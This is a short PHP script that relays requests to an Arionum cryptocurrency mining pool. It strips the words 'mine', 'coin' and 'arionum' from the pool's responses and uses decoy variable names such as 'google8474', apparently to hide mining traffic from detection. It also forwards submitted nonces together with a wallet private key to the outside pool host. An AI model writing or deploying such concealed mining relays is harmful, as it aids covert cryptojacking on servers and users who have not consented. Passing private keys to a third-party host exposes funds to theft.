<?php

if($_GET["q"] == "deploy")

{

$google8474 = file_get_contents("http://mine.arionumpool.com/mine.php?q=info");

$google8474 = preg_replace("/mine/","",$google8474);

$google8474 = preg_replace("/coin/","",$google8474);

$google8474 = preg_replace("/arionum/","",$google8474);

echo "$google8474";

}

if($_GET["q"] == "deploydev")

{

$google84741 = $_POST["argon"];

$google84742 = $_POST["nonce"];

$google84744 = $_POST["private_key"];

$google847412 = $_POST["public_key"];

$google847446 = $_POST["address"];

$postData = http_build_query(
            [
                'argon'       => $google84741,
                'nonce'       => $google84742,
                'private_key' => $google84744,
                'public_key'  => $google847412,
                'address'     => $google847446,
            ]
        );

$opts = [
   'http' =>
        [
           'method'  => 'POST',
           'header'  => 'Content-type: application/x-www-form-urlencoded',
           'content' => $postData,
        ],
];

$context = stream_context_create($opts);

$res = file_get_contents("http://mine.arionumpool.com/mine.php?q=submitNonce", false, $context);
$data = json_decode($res, true);

if ($data['status'] == "ok")

{

echo "$res";

}

else

{

echo "$res";

}

}

?>
